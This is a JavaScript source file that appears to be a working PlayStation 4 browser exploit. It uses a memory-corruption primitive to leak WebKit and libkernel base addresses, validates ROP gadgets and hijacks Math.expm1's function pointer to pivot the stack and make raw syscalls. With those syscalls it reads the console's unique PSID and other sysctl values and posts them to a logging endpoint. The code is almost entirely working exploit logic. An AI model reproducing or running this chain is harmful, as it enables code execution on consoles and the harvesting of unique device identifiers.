// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
// virgin instance, pinning ~137 MB for the life of the page.
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

function post(tag, detail) {
    try {
        const x = new XMLHttpRequest();
        x.open("POST", "/t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-SYSCTL&tag=" + encodeURIComponent(tag)
             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
    / -- /, /\.\s/, /;\s/,
    /,\s+(which|so|and that|because|since|as that)\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {

    const raw = detail;
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, raw);
}

function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}

// Only what a dry sysctl read needs. The poops table lives between the head
// and body ranges we extract, so it must be restated here or SYS is undefined
// at runtime -- which node --check cannot see.
const SYS = { getpid: 20, getuid: 0x18, sysctl: 0xca };
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let allDone = false;

(async function () {
    let p = null;
    try {
        const { key, off } = offsetsFor(navigator.userAgent);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) { state("no offsets for this firmware", "bad"); return; }
        mark("FW-STATUS", off.fw_status || "none");


        state(" أنتظر رجاءاً Please wait...", "warn");
        await new Promise(r => setTimeout(r, 0));

        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
        installWindowP(carrier, { promote: false });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted
            + "   (promotion off: the 137 MB stays pinned)");
        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("module-bases-0x4000-aligned",
            aligned(webkitBase) && aligned(libkernelBase), "")) return;

        const G = {};
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GAD) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
        }
        if (!check("gadget-table-fits-module", gated === GAD.length,
            gated + "/" + GAD.length)) return;
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        const stubAddr = new Map();
        let seeded = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                stubAddr.set(num, libkernelBase.add32(o)); seeded++;
            }
        }
        const need = new Set(Object.keys(SYS).map(k => SYS[k])
            .filter(n => !stubAddr.has(n)));
        let scanned = 0;
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (!need.has(num)) continue;
            stubAddr.set(num, libkernelBase.add32(o)); need.delete(num); scanned++;
        }
        mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
        const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
        if (!check("syscall-page-needs-stub", miss.length === 0,
            miss.join(","))) return;

        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
                .add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                dv.setUint32(at, v.low >>> 0, true);
                dv.setUint32(at + 4, v.hi >>> 0, true);
            }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        function makeCtx() {
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            keepAlive.push(sb, pb, kb, fb);
            const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
                c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb);
            c.K = bufAddr(kb); c.F = bufAddr(fb);
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        function layout(c, target, args) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        const M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);
        const pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;
        function callAddr(target, args) {
            layout(M, target, args);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return { lo: M.frameDv.getUint32(0, true),
                     hi: M.frameDv.getUint32(4, true),
                     i32: M.frameDv.getUint32(0, true) | 0 };
        }
        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
        function errno() {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        }
        const pid = sc(SYS.getpid).i32;
        check("chain-reaches-kernel", pid > 0,
            "pid=" + pid + " uid=" + sc(SYS.getuid).i32);

        const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
        const scratch = bufAddr(scratchAb);
        const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
        const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
        const lenAb = new ArrayBuffer(8); keepAlive.push(lenAb);
        const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);

        // ==================== sysctlbyname ====================
        // The two-step FreeBSD dance, exactly as misc.lua:144 does it:
        //   1. sysctl({0,3}, 2, oid_out, &oidlen, name_string, strlen)
        //        {0,3} = CTL_SYSCTL / CTL_SYSCTL_NAME2OID
        //   2. sysctl(oid, oidlen/4, out, &outlen, 0, 0)
        //
        // One difference from the Lua on purpose: it hardcodes 2 as the OID
        // length in step 2, which is right for machdep.openpsid only because
        // that OID happens to be two levels deep. We use the length the kernel
        // actually returned, which is correct for any name.
        const nmAb = new ArrayBuffer(8); keepAlive.push(nmAb);
        const nmAddr = bufAddr(nmAb), nmDv = new DataView(nmAb);
        const mibAb = new ArrayBuffer(0x70); keepAlive.push(mibAb);
        const mibAddr = bufAddr(mibAb), mibDv = new DataView(mibAb);
        const strAb = new ArrayBuffer(0x80); keepAlive.push(strAb);
        const strAddr = bufAddr(strAb), strU8 = new Uint8Array(strAb);
        const outAb = new ArrayBuffer(0x100); keepAlive.push(outAb);
        const outAddr = bufAddr(outAb), outDv = new DataView(outAb);
        const outU8 = new Uint8Array(outAb);

        function name2oid(name) {
            strU8.fill(0);
            for (let i = 0; i < name.length; ++i) strU8[i] = name.charCodeAt(i) & 0xff;
            new Uint8Array(mibAb).fill(0);
            nmDv.setUint32(0, 0, true); nmDv.setUint32(4, 3, true);
            lenDv.setUint32(0, 0x70, true); lenDv.setUint32(4, 0, true);
            const rv = sc(SYS.sysctl, nmAddr, 2, mibAddr, lenAddr,
                          strAddr, name.length).i32;
            if (rv !== 0) return { rv: rv, err: errno(), n: 0 };
            return { rv: 0, err: 0, n: (lenDv.getUint32(0, true) / 4) | 0 };
        }

        // Returns the byte length written, or -1. Data lands in outU8/outDv.
        function sysctlByName(name, want) {
            const o = name2oid(name);
            if (o.rv !== 0 || o.n === 0) {
                mark("SYSCTL-NAME2OID-FAIL", name + " rv=" + o.rv + " errno=" + o.err);
                return -1;
            }
            outU8.fill(0);
            lenDv.setUint32(0, want, true); lenDv.setUint32(4, 0, true);
            const rv = sc(SYS.sysctl, mibAddr, o.n, outAddr, lenAddr, 0, 0).i32;
            if (rv !== 0) {
                mark("SYSCTL-READ-FAIL", name + " rv=" + rv + " errno=" + errno()
                    + " oid_len=" + o.n);
                return -1;
            }
            const oid = [];
            for (let i = 0; i < o.n; ++i) oid.push(mibDv.getInt32(i * 4, true));
            trace("SYSCTL-OID", name + " = " + oid.join("."));
            return lenDv.getUint32(0, true);
        }
        const hex = n => {
            let t = "";
            for (let i = 0; i < n; ++i)
                t += (outU8[i] < 16 ? "0" : "") + outU8[i].toString(16);
            return t.toUpperCase();
        };
        const asciiOut = n => {
            let t = "";
            for (let i = 0; i < n; ++i) { if (!outU8[i]) break; t += String.fromCharCode(outU8[i]); }
            return t;
        };

        // ==================== THE PSID ====================
        state("reading machdep.openpsid...", "warn");
        {
            const n = sysctlByName("machdep.openpsid", 0x10);
            if (n > 0) {
                mark("PSID", hex(n) + "   (" + n + " bytes)");
                let nz = 0;
                for (let i = 0; i < n; ++i) if (outU8[i]) nz++;
                check("openpsid-readable-from-webkit-userland",
                    n === 0x10 && nz > 0, "len=" + n + " nonzero_bytes=" + nz);
            } else {
                check("openpsid-readable-from-webkit-userland", false,
                    "sysctl refused -- see the FAIL mark above");
            }
        }

        // ==================== a few more, as a harness ====================
        state("reading other sysctls...", "warn");
        for (const [nm, len, kind] of [
            ["kern.ostype", 0x20, "s"],
            ["kern.osrelease", 0x20, "s"],
            ["kern.sdk_version", 8, "x"],
            ["kern.hostname", 0x40, "s"],
        ]) {
            const n = sysctlByName(nm, len);
            if (n > 0) mark("SYSCTL", nm + " = "
                + (kind === "s" ? JSON.stringify(asciiOut(n)) : hex(n))
                + "  (" + n + " bytes)");
            else mark("SYSCTL", nm + " = <unavailable>");
        }

        mark("UID", "uid=" + sc(SYS.getuid).i32 + " pid=" + sc(SYS.getpid).i32
            + "   (unprivileged -- no kernel bug was used)");
        state("done", "ok");
        allDone = true;

    } catch (e) {
        mark("THREW", (e && e.message) ? e.message : String(e));
        state("threw", "bad");
    } finally {
        // Put Math.expm1 back. This page arms nothing else, so this is the whole
        // teardown -- no kernel object was touched and no fd was leaked.
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e2) { mark("DISARM-THREW", (e2 && e2.message) || String(e2)); }
        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount
            + (allDone ? "" : "  INCOMPLETE"));
    }
})();
